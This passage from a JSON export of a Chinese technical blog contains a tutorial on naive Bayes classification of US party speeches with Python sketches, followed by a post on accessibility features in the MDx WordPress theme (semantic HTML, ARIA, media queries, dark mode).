<strong>是一个简单但高效的分类算法</strong>，在进行不复杂的文本分类时高效且拥有不低的准确度，判断垃圾邮件就是用朴素贝叶斯进行文本分类的一个经典例子。当然朴素贝叶斯分类不仅能用在 NLP 中，在许多分类问题中朴素贝叶斯也有非常好的效果，但我们今天只关注它在 NLP 中的应用。</p>\n<p>要了解朴素贝叶斯，我们要先来了解一下贝叶斯定理。</p>\n<blockquote>\n<p>每增加一个数学公式都会使读者减半。</p>\n<footer>——霍金</footer>\n</blockquote>\n<p>那么，就让我们先来看看贝叶斯定理的公式吧（笑</p>\n<p>$$P(A|B) = \\frac{P(AB)}{P(B)} = \\frac{P(B|A)P(A)}{P(B)}$$</p>\n<p>其实还是很简单的，运用高中的条件概率知识就能理解。本质上，贝叶斯定理给出了一种方法，使得我们可以在 \\(P(A|B)\\) 和 \\(P(B|A)\\) 之间互相转换，因为通常情况下它们是不一样的。</p>\n<p>要更好地理解，请考虑这样一个例子：</p>\n<blockquote><p>假设有一个学校图书馆，图书管理员正为找不到某本书而发愁。已知老师有 70% 的意愿借走这本书，而是学生的意愿是 30%，这个学校的师生比例是 1:10，那么借走这本书的人是老师的概率有多大？</p></blockquote>\n<p>设学校总人数为 \\(T\\)，我们可以很容易地写出这样的一个式子：</p>\n<p>$$\\begin{align} P &amp; = \\frac{T\\cdot\\frac{1}{11}\\cdot 70\\%}{T\\cdot\\frac{1}{11}\\cdot 70\\%+T\\cdot\\frac{10}{11}\\cdot 30\\%} \\\\ &amp; = \\frac{70\\%}{70\\%+10\\times30\\%} \\\\ &amp; = \\frac{7}{37} \\end{align}$$</p>\n<p>这就是贝叶斯定理了！等等，你可能会挠挠头，这哪里是贝叶斯了？别急，如果我们把最上面的式子换个字母的话...</p>\n<p>$$P(H|E) = \\frac{P(E|H)P(H)}{P(E)}$$</p>\n<p>在这里，\\(H\\) 指 Hypothesis，即假设，而 \\(E\\) 指 Evidence，即证据。这样，这个式子就很好理解了，在我们上面的例子里，借走书是证据，那么 \\(P(E)\\) 就是某个人选择借走这本书的概率；这个人是老师是假设，那么这个人是老师的概率是 \\(P(H)\\)。<strong>注意这里的概率指在学校中抽一个人是老师的概率，并不是“在借走书的前提下”这个人是老师的概率</strong>，而“在借走书的前提下”这个人是老师的概率应该是 \\(P(H|E)\\)，也正是我们要求的概率。同样地，而“这个人是老师”的前提下借走书的概率就是 \\(P(E|H)\\) 了。</p>\n<p>那么再来看看上面我们凭小学知识就列出的计算式，如果把里面的具体数据换成概率来表示的话，这个式子就会变成...</p>\n<p>$$P(H|E) = \\frac{T\\cdot P(E|H)P(H)}{T\\cdot P(E|H)P(H) + T\\cdot P(E|\\neg H)P(\\neg H)}$$</p>\n<p>好吧，这里解释一下，\\(\\neg\\) 符号表示“非”，所以 \\(P(E|\\neg H)\\) 表示在“这个人不是老师”的前提下借走书的概率。而 \\(T\\cdot P(E|H)P(H)\\) + \\(T\\cdot P(E|\\neg H)P(\\neg H)\\)，即“可能借走书的老师的数量 + 可能借走书的学生的数量”，就是“可能借走书的人的数量”了，也就是 \\(T\\cdot P(E)\\)。上下消去 \\(T\\)，我们就能得到上面的式子了。</p>\n<p>$$P(H|E) = \\frac{P(E|H)P(H)}{P(E)}$$</p>\n<p>这就是贝叶斯了定理。如果你还是不太清楚，可以去看看 3Blue1Brown 的<a href=\"https://www.bilibili.com/video/av84799361\">这个视频</a>，图形化的讲解会清晰很多。</p>\n<p>这里我要提一下这个式子里各部分的专有名称了（“专业高端”词汇警告），你可以不记住，直接看后面。</p>\n<ul>\n<li>\\(P(H|E)\\) 叫做 \\(H\\) 的<strong>后验概率</strong>，反之亦然</li>\n<li>\\(P(H)\\) 叫做 \\(H\\) 的<strong>先验概率</strong>，反之亦然</li>\n<li>特别地，我们把 \\(P(E|H)\\) 称作<strong>“似然值”</strong>，即 likelihood</li>\n</ul>\n<p>那什么是朴素贝叶斯呢？按上面所说的，朴素贝叶斯是一种分类算法。简单来说，朴素贝叶斯将一个对象的各个特征考虑为互相独立，然后根据这些特征的概率的乘积来判断对象所属的分类。基本原理如下：</p>\n<p>$$P(H|E) = \\frac{P(E|H)P(H)}{P(E)} \\propto P(E|H)P(H) = P(H)\\prod_{i}P(W_i|H)$$</p>\n<p>在这里，\\(W_i\\) 指某一对象的第 \\(i\\) 个特征，对于文本分类来说，这就是一段文本中的某个单词。</p>\n<p>朴素贝叶斯之所以“朴素”，是因为它要求<strong>各个特征间是独立的</strong>，在文本分类中也就是各个单词之间互不干扰。虽然思路简单的代价是适用范围变窄，不过由于这样的简化在很多情况下已经足够了，因此实际上朴素贝叶斯的应用范围非常广。<del>你看朴素贝叶斯 <strong>N</strong>aïve <strong>B</strong>ayes 的缩写都是 NB 了，能不厉害吗（逃</del></p>\n<h1>那么，咋分类啊</h1>\n<p>看来你这下完全听懂了呢（笑），是时候看看如何在 NLP 中应用朴素贝叶斯了。和上面一样，我们用一个具体的例子来说明。我们的目标是让电脑学会分类美国共和党和民主党的演讲稿，由于两个党派的演讲风格不同，所以这样的分类在理论上是可行的。</p>\n<div class=\"wp-block-file\">\n<a href=\"https://acdn.flyhigher.top/nlp/material.zip\" download>material.zip</a><a href=\"https://acdn.flyhigher.top/nlp/material.zip\" class=\"wp-block-file__button\" download>下载</a>\n</div>\n<p>上面我们要用到的数据集，你可以下载下来一起动手玩一玩。先说一下数据集的数据结构吧，压缩包里有两个文件，<code>train.txt</code> 将会被当作训练数据集，而 <code>test.txt</code> 则会作为训练结束后的验证数据集。两个文本文件里数据的结构是类似的，就像这样：</p>\n<pre class=\"EnlighterJSRAW\">BLUE WELL I AM SO HONORED AND PERSONALLY UNKNOWNWORD TO BE HERE...\r\nRED THANK YOU . THIS IS QUITE AN INSTITUTION . IT'S GOOD TO BE...</pre>\n<p>每行都是一篇演讲稿，每行的第一个单词指明了这篇演讲稿所属的党派，<code>RED</code> 指共和党，而 <code>BLUE</code> 指民主党。所有单词和符号都已经被转为大写并由空格分隔方便处理。<code>train.txt</code> 有共和党演讲稿和民主党演讲稿各 23 篇，<code>test.txt</code> 有 6 篇共和党演讲稿，12 篇民主党演讲稿。</p>\n<p>明白了？那我们就开始吧。</p>\n<h2>捋捋思路</h2>\n<p>首先，我们需要考虑如何在文本分类中应用朴素贝叶斯。很简单，按朴素贝叶斯的思路，<strong>计算每个词在某一分类下的出现概率，然后将某篇文章的所有词的概率相乘，再乘以该分类的先验概率，就可以得到某篇文章在某一分类下的概率。</strong></p>\n<p>$$P(Class|Article) = P(Class)\\prod_{i}P(Word_i|Class)$$</p>\n<p>各个分类概率都计算完成后，概率最高的那个分类就是这篇文章可能所属的分类。这个思路的核心就是用词决定了文本风格，文本的不同类别用词会有差异，只要能量化这些差异就可以分类文本。在我们的例子中，我们可以从 <code>train.txt</code> 中统计各个词汇的出现情况，然后用 <code>test.txt</code> 中的数据按上面的算法验证我们算法的准确性。</p>\n<p>这个思路很简单也很清晰，但还有一些问题需要解决。<strong>第一，有的时候，我们的测试数据集中可能会出现一个在训练数据集中没有出现过的词语。这个时候，朴素贝叶斯的计算结果会是 0。</strong>如果我们把 0 乘进式子中，那就别想得到正常的结果了。所以，我们还需要对计算某一单词在某一分类中的式子稍加改进。使用拉普拉斯平滑，就可以避免出现概率为 0 的情况。别被名字吓到，拉普拉斯平滑是一种非常简单的平滑方法：在分子上 +1，在分母上加整个取值范围，这样就可以给整个分式加上非常微小的偏移，避免出现 0。</p>\n<p>$$\\begin{align} P(Word_i|Class) &amp; = \\frac{Word_iCountInClass}{AllWordCountInClass} \\\\ &amp; \\approx \\frac{Word_iCountInClass + 1}{AllWordCountInClass + UniqueWordCount} \\end{align}$$</p>\n<p><strong>第二，对于长文本，大部分词语在某一分类中的出现概率是远小于 1 的，加上长文本词汇量大，往往概率相乘的结果会非常小。</strong>受限于计算机处理浮点数的原理，精确处理这么小的数字是很麻烦的。幸好，运用一些简单的数学知识就可以将其转化为更精确的表达，<strong>那就是取对数。</strong></p>\n<p>首先，将概率计算结果取对数并不影响我们的计算结果。因为取对数是一个单调递增的操作，而我们计算概率只是为了排序选择概率最高的分类，因此取对数是不影响我们排序的。而把多项式取对数，等于把多项式的每一项取对数后相加。所以我们有：</p>\n<p>$$\\lg{\\Big(P(Class)\\prod_{i}P(Word_i|Class)\\Big)} = \\lg{P(Class)} + \\sum_i\\lg{P(Word_i|Class)}$$</p>\n<p>大部分情况下，在每一次取对数的时候，要取对数的数字的大小，即 \\(P(Word_i|Class)\\) 尚还在计算机能处理的范围内，<strong>因此我们可以放心地使用取对数的方法</strong>，避免计算机精度不够影响结果。</p>\n<p><strong>第三就是在某些情况下，可能会有部分词语干扰计算结果</strong>，如 and, is 这类的被大量使用的中性词。如果希望得到更好的结果，我们可以维护一个停用词表，在计算时排除停用词即可。或者，我们可以在计算完每个单词的出现数量后，排除数量最多的前 \\(N\\) 个单词，避免这些单词过多地影响计算。</p>\n<h2>写点代码</h2>\n<p>现在我们终于可以开始实战，写点代码了。我会用简单的 Python 来表达思路。好了，理一理思绪，第一步我们要做的，是统计训练数据集中的用词情况。具体来说，根据上面的思考，我们需要统计的有：</p>\n<ul>\n<li>每个单词在各分类中出现的数量</li>\n<li>各分类中的不重复词数量</li>\n</ul>\n<p>用 Python 简单表示如下：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"python\"># 读入数据过程略...\r\ndata_raw = \"读入的数据\".split('\\n') # 按行分隔\r\ndata_blue = []\r\ndata_red = []\r\nword_count_blue = {}\r\nword_count_red = {}\r\n\r\nfor line_data in data_raw:\r\n    word_list = line_data.split(\" \") # 分隔单词\r\n    if word_list[0] == \"BLUE\":\r\n        for i in range(1,len(word_list)):\r\n            if not is_excluded(word_list[i]): # 判断是否为停用词\r\n                data_blue.append(word_list[i])\r\n                # 统计单词出现次数\r\n                word_count_blue.setdefault(word_list[i], 0)\r\n                word_count_blue[word_list[i]] += 1\r\n    elif word_list[0] == \"RED\":\r\n        # Class = red 时同理...\r\n\r\n#统计非重复词\r\nunique_words_blue = list(set(data_blue))\r\nunique_words_red = list(set(data_red))</pre>\n<p>训练过程到这里就结束了，计算机已经知道了各政党演讲的用词习惯。很简单吧？接下来我们就要使用测试数据集来测试准确度了。<strong>这里开始就涉及到朴素贝叶斯的计算了</strong>，可能会稍微复杂一点点。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"python\">import math\r\n#读入测试数据过程略...\r\ntest_data_raw = \"读入的数据\".split('\\n') # 按行分隔\r\ntest_data = []\r\n\r\nfor line_data in test_data_raw:\r\n    if line_data[0] == \"BLUE\":\r\n        content_data = line_data.split(\" \").pop(0)\r\n        test_data.append({\"class\": \"blue\", \"content\": content_data})\r\n    elif line_data[0] == 'RED':\r\n        # ...\r\n\r\nfor line_data in test_data:\r\n    posibility_blue = 0\r\n    for word in line_data[\"content\"]:\r\n        # 计算各单词概率，取对数后相加，使用了拉普拉斯平滑\r\n        if word in word_count_blue:\r\n            posibility_blue += math.log((word_count_blue[word]+1)/(len(data_blue)+len(unique_words_blue)+len(unique_words_red)))\r\n        else:\r\n            posibility_blue += math.log(1/(len(data_blue)+len(unique_words_blue)+len(unique_words_red)))\r\n    # 最后加上该分类概率的对数\r\n    posibility_blue += math.log(len(data_blue)/(len(data_blue)+len(data_red)))\r\n\r\n    # 计算 Red 同理...</pre>\n<p>计算完成后，我们就得到每篇演讲稿在各分类下的概率了。之后，简单的比较就能得出推断的分类：如果 \\(P(Red|Article)\\) 大于 \\(P(Blue|Article)\\)，那么这篇演讲稿就更可能是共和党的演讲稿，反之则是民主党的演讲稿。</p>\n<p>很好理解吧？那么这么简单的思路，准确性怎么样呢？对于我们的例子，这是我设置了个别停用词后的结果：</p>\n<pre class=\"EnlighterJSRAW\">+-----+-------+--------------+--------------+-------+-------+\r\n|   ID|  Class|        P(Red)|       P(Blue)|  Guess| Status|\r\n+-----+-------+--------------+--------------+-------+-------+\r\n|    1|   Blue|  -23204.68377|  -22998.67066|   Blue|      √|\r\n|    2|   Blue|  -16438.44625|  -16137.48257|   Blue|      √|\r\n|    3|   Blue|  -33468.81214|  -32567.61801|   Blue|      √|\r\n|    4|   Blue|    -8606.2193|   -8601.50426|   Blue|      √|\r\n|    5|   Blue|  -12430.97436|  -11935.70662|   Blue|      √|\r\n|    6|   Blue|  -44033.02883|  -43877.55367|   Blue|      √|\r\n|    7|   Blue|   -16947.2851|  -16758.57542|   Blue|      √|\r\n|    8|   Blue|  -26957.26997|  -26889.62444|   Blue|      √|\r\n|    9|   Blue|  -27503.73985|  -27249.21828|   Blue|      √|\r\n|   10|   Blue|   -20528.4457|   -19991.1248|   Blue|      √|\r\n|   11|   Blue|  -20337.96493|  -19860.12831|   Blue|      √|\r\n|   12|   Blue|  -28409.28489|  -28118.98017|   Blue|      √|\r\n|   13|    Red|  -13756.01015|  -14488.11751|    Red|      √|\r\n|   14|    Red|  -17221.22732|  -17710.15936|    Red|      √|\r\n|   15|    Red|  -17397.45136|  -17899.98659|    Red|      √|\r\n|   16|    Red|  -10724.69095|  -11092.77837|    Red|      √|\r\n|   17|    Red|  -10402.40027|  -10859.48681|    Red|      √|\r\n|   18|    Red|   -9371.53792|    -9669.6769|    Red|      √|\r\n+-----+-------+--------------+--------------+-------+-------+\r\n|                                      Total: 18/18, 100.0% |\r\n+-----------------------------------------------------------+</pre>\n<p><strong>100% 的准确率哦！</strong>事实上，对于我们的这个例子，就算不设置停用词，我们仍能达到 100% 的分类准确率。朴素贝叶斯分类的确很 NB 呢。</p>\n<h1>更进一步</h1>\n<p>我们的探索到这里就结束了，但如果你有兴趣，完全可以继续探索下去。我们的例子是一个非常简化的例子，在实际情况中，还有很多问题需要解决。比如，对于中文及类似语言，不存在拉丁语系的天然分词结构，而朴素贝叶斯的文本分类是基于单词的，那么<strong>中文的分词就会是个问题；</strong>再比如，对于朴素贝叶斯分类来说，<strong>词语之间的顺序是不影响分类结果的</strong>，但这就会导致“今天心情很好，但昨天不好”和“昨天心情很好，但今天不好”在朴素贝叶斯看来是一样的，要想获得更好的结果，我们必须<strong>考虑词语的顺序。</strong></p>\n<p>这些问题，今天我们就不再深究了，但你可以自己探索。比如，引入思路同样很简洁的马尔科夫链，我们就可以让计算机学会考虑词语间的顺序，不过那就会是另一个话题了。</p>\n","link":"https://flyhigher.top/develop/1989.html"},{"title":"MDx 中增强页面可访问性的细节","date":"2020-01-25 16:45:04","description":"\n<blockquote><p>这篇文章本来是打算发在 <a href=\"https://mdxblog.flyhigher.top/\">MDx Blog</a> 的，不过写到后来发现这篇文章相对来说还是有价值的，于是就将这篇文章转移到了无垠，MDx Blog 则不再发表这篇文章。</p></blockquote>\n<p>从 MDx 开发之初，增强页面的可访问性就被列为了一个重要目标。从 HTML 语义化，到 ARIA 地标，再到 <code>prefers-reduced-motion</code>，随着浏览器对于增强页面可访问性的支持功能越来越多，MDx 也在不断地更新，让更多的人都能毫无困难地浏览、查看由 MDx 渲染的网页。本文会详细说明一些 MDx 中增强页面可访问性的细节，<strong>如果你希望增强自己开发的网页的可访问性，本文可能会对你有所帮助。</strong></p>\n<h1>基础性增强</h1>\n<p>增强可访问性，最重要也是最基础的一点就是 HTML 语义化。通过使用 HTML 5 语义化标签和 ARIA Role 标签，我们可以很方便地<strong>将整个网页在语义上分为几部分，而这将有效地改善屏幕阅读器对网页的分析质量，使视力障碍用户更好地浏览网页。</strong></p>\n<h2>HTML 语义化</h2>\n<p><strong>HTML 语义化属于增强页面可访问性的基础中的基础。</strong>通过使用语义化的 HTML 标签，我们可以方便地为网页中的各部分标记功能而不影响页面样式。随着符合 HTML 5 的现代化网页成为主流，语义化标签已被很大一部分网站所支持，我也不过多赘述了。就举几个常用的“地标性”标签吧：</p>\n<ul>\n<li>\n<code>header</code> 标签标记页眉，默认样式同 <code>div</code>，不要把它和 <code>head</code> 搞混了</li>\n<li>\n<code>main</code> 标签标记页面的主要内容，默认样式同 <code>div</code>\n</li>\n<li>\n<code>article</code> 标签标记文章（在 HTML 5 中它指任何独立或可复用的文本），默认样式同 <code>div</code>\n</li>\n<li>\n<code>footer</code> 标签标记页脚，默认样式同 <code>div</code>\n</li>\n<li>\n<code>nav</code> 标签标记页面导航栏区域，默认样式同 <code>div</code>\n</li>\n<li>\n<code>aside</code> 标签标记侧栏，默认样式同 <code>div</code>\n</li>\n<li>\n<code>section</code> 标签标记“一组内容”，你可以把它看作是划定网页中一块区域的通用标签，默认样式同 <code>div</code>\n</li>\n</ul>\n<p>只要用这些标签替代 <code>div</code> 而不是无脑使用 <code>div</code> 就能提高页面的可访问性。MDx 使用了这些标签来增强页面的可访问性。</p>\n<h2>下一步，ARIA</h2>\n<p>有的时候，出于一些原因，我们没法使用语义化的 HTML 标签，或者没有合适的语义化标签来标记内容，这时候<strong>我们就需要使用 ARIA (Accessible Rich Internet Applications，可访问的富互联网应用)。</strong>ARIA 的基础用法很简单，只要在相应元素上加上 <code>role</code> 属性指定该元素的功能即可。下面是一个简单的例子：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"html\">&lt;div role=\"navigation\"&gt;\r\n  &lt;ul&gt;\r\n    &lt;li&gt;&lt;a href=\"#\"&gt;Page A&lt;/a&gt;&lt;/li&gt;\r\n    &lt;li&gt;&lt;a href=\"#\"&gt;Page B&lt;/li&gt;\r\n    &lt;li&gt;&lt;a href=\"#\"&gt;Page C&lt;/a&gt;&lt;/li&gt;\r\n  &lt;/ul&gt;\r\n&lt;/div&gt;</pre>\n<p>通过 <code>role=\"navigation\"</code>，我们把一个 <code>div</code> 标记为了导航栏区域。实际上，对屏幕阅读器来说，这和 <code>nav</code> 标签在语义上是一致的。上一节中的例子都可以分别用以下 ARIA Role 表示：</p>\n<ul>\n<li><code>role=\"heading\"</code></li>\n<li><code>role=\"main\"</code></li>\n<li><code>role=\"article\"</code></li>\n<li><code>role=\"contentinfo\"</code></li>\n<li><code>role=\"navigation\"</code></li>\n<li><code>role=\"complementary\"</code></li>\n<li><code>role=\"region\"</code></li>\n</ul>\n<p>除此以外，MDx 还使用了 <code>role=\"banner\"</code> 和 <code>role=\"search\"</code> 来分别标记页面中的顶部栏和搜索表单。另外，<strong>有的时候 <code>role</code> 属性还需配合 <code>aria-*</code> 属性一同使用</strong>，具体规则比较复杂，我就不在这里赘述了，具体可参考 <a href=\"https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles\">WAI-ARIA Roles - MDN</a>。</p>\n<h1>媒体查询来帮忙</h1>\n<p>CSS 的媒体查询其实是一个非常强大的特性，<strong>妥善利用其中的一些特性，我们可以在网页外观上大大增强网页的可访问性。</strong>除了已经烂大街的“对浏览器窗口大小”响应的媒体查询，我会介绍 3 个很少有网站充分利用的媒体查询。</p>\n<h2>print</h2>\n<p><code>print</code> 媒体查询其实已经“历史悠久”了，<strong>只要使用 <code>@media print {...}</code> 就可以创建只在打印页面时生效的样式。</strong>通过这种方式，我们可以让页面在打印时应用一套为打印优化的样式，增强页面在物理纸张上的可访问性。</p>\n<blockquote><p>维基百科是对打印样式做了单独适配的著名例子。</p></blockquote>\n<p><strong>由于在打印的情况下，页面已经离开了“可交互”的范围，还有分页这种在屏幕中无需考虑的问题，要让页面在物理纸张上仍能被轻松地阅读，我们需要做一些特殊的适配。</strong>直接来看一个例子吧。以下是 MDx 针对打印情况进行的一些特殊优化，样式的具体理由已经写在了注释中。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"css\">@media print {\r\n    /*隐藏不必要的元素*/\r\n    header, .mdx-ad-after-article, .mdx-ad-in-article, .mdx-post-money, .page-footer-nav, .mdx-same-posts, .spanout button, .mdui-drawer, .mdui-overlay, .mdui-menu, .mdx-share-img-dialog, .mdx-share-wechat-dialog {\r\n        display: none!important;\r\n    }\r\n\r\n    /*使用下划线标记链接*/\r\n    article a {\r\n        text-decoration: underline!important;\r\n    }\r\n    /*由于纸张不可交互，在链接后显示链接到的 URL*/\r\n    article a::after {\r\n        content: \"(\" attr(href) \")\";\r\n    }\r\n\r\n    /*强制白底黑字*/\r\n    html &gt; body {\r\n        background-color: white!important;\r\n    }\r\n    article p {\r\n        color: rgba(0,0,0,.8)!important;\r\n    }\r\n\r\n    /*对于纸张上的长文章，衬线字体拥有更好的可读性。以下字体列表来自 fonts.css*/\r\n    article {\r\n        font: 13pt Georgia, \"Nimbus Roman No9 L\", \"Songti SC\", \"Noto Serif CJK SC\", \"Source Han Serif SC\", \"Source Han Serif CN\", STSong, \"AR PL New Sung\", \"AR PL SungtiL GB\", NSimSun, SimSun, \"TW\\-Sung\", \"WenQuanYi Bitmap Song\", \"AR PL UMing CN\", \"AR PL UMing HK\", \"AR PL UMing TW\", \"AR PL UMing TW MBE\", PMingLiU, MingLiU, serif!important;\r\n    }\r\n\r\n    /*除部分元素外，禁止在元素内部分页*/\r\n    * {\r\n        page-break-inside: avoid;\r\n    }\r\n    article p, article a, #comments, article {\r\n        page-break-inside: auto;\r\n    }\r\n}</pre>\n<p>MDx 自 1.9.3 版本起已经包含了对文章页的打印样式优化。可以很容易地看出，优化后的样式在物理纸张上将更容易阅读。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/6.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/6.jpg\" alt=\"\" width=\"1345\" height=\"1602\" class=\"aligncenter size-full wp-image-1959\"></a>\n<h2>prefers-color-scheme</h2>\n<p><code>prefers-color-scheme</code> 是最近才被浏览器广泛支持的一个媒体查询，但它的功能却很强大：<strong>响应系统级黑暗模式。</strong>这样，我们可以在开启黑暗模式的系统中让网页具有更好的可读性。不过由于这个媒体查询直到最近才被广泛支持，因此大部分网站对此并没有进行适配。</p>\n<blockquote><p>一些适配这一特性的网站：少数派、微信公众平台（文章页）等。</p></blockquote>\n<p>通过像这样的媒体查询，我们可以在系统启用黑暗模式时让页面实时响应：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"css\">@media (prefers-color-scheme: dark) {\r\n    body {\r\n        background-color: #212121;\r\n        color: rgba(255, 255, 255, .7);\r\n    }\r\n}</pre>\n<p><code>prefers-color-scheme</code> 一共有 3 个可能值：<code>no-preference</code>, <code>light</code> 和 <code>dark</code>。你也可以不像上面的例子那样默认使用亮色样式并在黑暗模式下启用黑暗样式，而可以反过来将黑暗样式作为默认，用亮色样式覆盖。在不支持的浏览器上将会显示默认样式（即媒体查询不会生效）。</p>\n<p>MDx 已经在 1.9.6 版本中包含对这一媒体查询的支持。</p>\n<h2>prefers-reduced-motion</h2>\n<p>看名字就猜得出，<code>prefers-reduced-motion</code> 是和 <code>prefers-color-scheme</code> 师出同门的媒体查询。因此，和 <code>prefers-color-scheme</code> 一样，它也是在最近才获得了浏览器的广泛支持。它的作用也很强大：<strong>响应系统的“减弱动态效果”模式。</strong>这对某些不喜欢甚至无法接受动画的用户可能很有帮助。要知道，对有些用户来说这甚至是医疗上的必要。使用如下的媒体查询，我们可以在系统启用减弱动态效果模式时让页面实时响应，减弱动画：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"css\">@media (prefers-reduced-motion: reduce) {\r\n    /*只是一个示例，实际情况中可以保留一些淡入淡出效果*/\r\n    * {\r\n        transition: all 0s!important;\r\n        transform: none!important;\r\n    }\r\n}</pre>\n<p><code>prefers-reduced-motion</code> 只有 2 个可能值：<code>no-preference</code> 和 <code>reduce</code>，在不支持的浏览器上该媒体查询不会生效。</p>\n<p>MDx 已经在 1.9.6 版本中包含对这一媒体查询的支持。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/5.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/5.jpg\" alt=\"\" width=\"792\" height=\"515\" class=\"aligncenter size-full wp-image-1962\"></a>\n<h1>黑暗模式适配</h1>\n<p>黑暗模式可不是简单地切换到黑底白字这么简单。<strong>单纯地使用黑底白字会导致页面元素之间对比度过高，文字刺眼，反而降低了页面的可访问性。</strong>我在下面总结了几条应用在了 MDx 中的黑暗模式优化规则和 Google 推荐的优化规则：</p>\n<p><strong>一是避免黑底白字。</strong>黑底白字看起来真的很难受，事实上，深灰和浅灰是黑暗模式最好的配色。比较下方例子里的两段文本，毫无疑问深灰色背景和浅灰色文字搭配的样式的可读性要比黑底白字高很多。（p.s. 有时候这条规则在白底黑字时也适用）</p>\n<p><strong>二是更改部分元素的亮度和对比度以增强可读性。</strong>你可能已经注意到了，下面优化的例子里标题文字的颜色改变了。很明显，未优化的黑暗模式中标题可读性不如优化的版本。在实际中，我们通常可以通过 CSS 滤镜来实现这一更改。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"css\">@media (prefers-color-scheme: dark) {\r\n    h1 {\r\n        /*反相颜色后再将色相旋转 180 度，使亮度反相*/\r\n        filter: invert(1) hue-rotate(180deg);\r\n    }\r\n}</pre>\n<p><strong>三是避免让图片过亮。</strong>未经处理的图片通常会导致过高的对比度，降低可读性。在 MDx 中，我选择降低图片的亮度来避免图片刺眼，而 Google 的建议则是使图片灰度，不过这会影响图片的整体观感。无论是哪一种方案，都可以使用 CSS 滤镜来轻松实现。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"css\">@media (prefers-color-scheme: dark) {\r\n    img { \r\n        /*MDx 方案*/\r\n        filter: brightness(.8);\r\n        /*Google 方案*/\r\n        filter: grayscale(.5);\r\n    }\r\n}</pre>\n<div>\n<div>\n<h1>Cats\n</h1>\n<p>这里是未优化的黑暗模式预览。接下来，让我们来看点可爱的猫猫吧。</p>\n<p><img src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/demo.jpg\"></p>\n</div>\n<div>\n<h1>Cats\n</h1>\n<p>这里是经过优化的黑暗模式预览。接下来，让我们来看点可爱的猫猫吧。</p>\n<p><img src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/demo.jpg\"></p>\n</div>\n</div>\n<h1>其他细节</h1>\n<p>还有一些细节，虽然简单，但不可或缺。我把一部分没有在上文提到的 MDx 中的细节列在了这里。</p>\n<p><strong>一是允许页面缩放。</strong>在开发响应式页面时，很多网站会在页面头部添加这样一个 <code>meta</code>：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"html\">&lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no\"&gt;</pre>\n<p>这样的 <code>meta</code> 设定了页面的宽度，却也固定了页面的缩放比例，用户难以手动放大网页。<strong>这样的设置对一部分视力障碍用户非常不友好</strong>，以至于苹果决定在自家的浏览器上忽略禁止缩放的 <code>meta</code>。按照 Google 的推荐，如果你在 MDx 设置中启用了“允许页面缩放”，那么 MDx 会输出这样的 <code>meta</code> 标签，允许页面进行五倍以内的缩放：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"html\">&lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1, maximum-scale=5\"&gt;</pre>\n<p><strong>尽管很多时候放大页面会导致页面结构被破坏，但这大大增强了页面的可访问性，利大于弊。</strong>因此，在 MDx 中，“允许页面缩放”是默认启用的。</p>\n<p><strong>二是在跨设备阅读时同步阅读记录。</strong>这属于 MDx 的“元老级”功能之一。注意到页面右上角的那个“在其他设备上继续阅读”的按钮了吗？如果你滚动页面后重新点击它，你会发现二维码发生变化了。通过在二维码中记录阅读进度，用户在扫描二维码切换设备阅读时，MDx 在新设备上会自动滚动到和原设备上一致的位置——好吧，目前基于百分比的算法在某些情况下可能不太准，但我已经设计了一个更复杂但更精确的阅读进度记录算法，之后就会更新到 MDx 中。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/8.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/8.jpg\" alt=\"\" width=\"1000\" height=\"574\" class=\"aligncenter size-full wp-image-1976\"></a>\n<p><strong>三是避免 Web 字体阻塞渲染。</strong>如果你在页面中使用了 Web 字体，在字体加载完成之前，浏览器可能不会渲染任何文本，这就导致用户可能需要等待一段时间才能开始浏览网页。Google 推荐使用 <code>font-display: swap;</code> 来向浏览器指定网页的 Web 字体渲染策略。这一规则会提供一个比较短的等待周期，如果在这段时间内 Web 字体没有完成加载，那么浏览器会以 fallback 字体渲染文本。任意时刻一旦 Web 字体完成渲染，浏览器就会使用 Web 字体重新渲染文本。这在大多数情况下都能满足可访问性的需求。</p>\n<p><strong>四是确保 html 元素具有合适的 <code>lang</code> 属性。</strong>这一属性声明了页面的主要语言，浏览器可以据此调整渲染策略，或者触发自动翻译；屏幕阅读器也能更好地阅读网页。</p>\n<p><strong>五是确保页面主要内容在丢失/禁用了 Javascript 甚至 CSS 的情况下仍然可用。</strong>作为一个以内容为主的网站，MDx 在禁用了 Javascript 的情况下页面主要内容仍然可用。这不只是为了 SEO，更是为了保证页面的可访问性。的确，目前的情况下，如果开启了 Lazyload，MDx 在禁用 Javascript 的情况下图片的确无法显示，但我会在后续版本中尽可能的优化这一问题。</p>\n<h1>附录：媒体查询开发技巧</h1>\n<p>有的时候，光有 CSS 响应媒体查询还不够，我们可能需要在 Javascript 中实时响应媒体查询。用如下代码就可以很简单地响应媒体查询：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">let mql = window.matchMedia(\"(prefers-reduced-motion: reduce)\");\r\nmql.addListener(handleMediaChange);\r\n\r\n//在添加监听后先调用一次，获得当前查询结果\r\nhandleMediaChange(mql);\r\n\r\nfunction handleMediaChange(mql){\r\n    if(mql.matches){\r\n        //查询匹配\r\n    }else{\r\n        //查询不匹配\r\n    